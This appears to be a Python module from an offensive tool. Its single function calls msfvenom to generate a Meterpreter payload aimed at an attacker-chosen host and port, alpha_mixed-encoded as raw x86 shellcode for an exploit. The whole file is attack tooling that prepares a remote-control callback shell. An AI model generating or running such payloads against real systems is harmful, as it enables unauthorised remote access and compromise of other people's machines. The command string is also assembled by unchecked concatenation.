"""
Generates the Meterpreter payload from msfvenom
"""
import subprocess

def payloadGenerator(msfpath, msfvenom, msfpayload, ip, port):
  payload = subprocess.Popen('ruby ' + msfpath + msfvenom + ' -p ' + msfpayload + ' LHOST=' + ip + ' LPORT=' + str(port) + ' EXITFUNC=thread -e x86/alpha_mixed -f raw BufferRegister=EAX', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
  return payload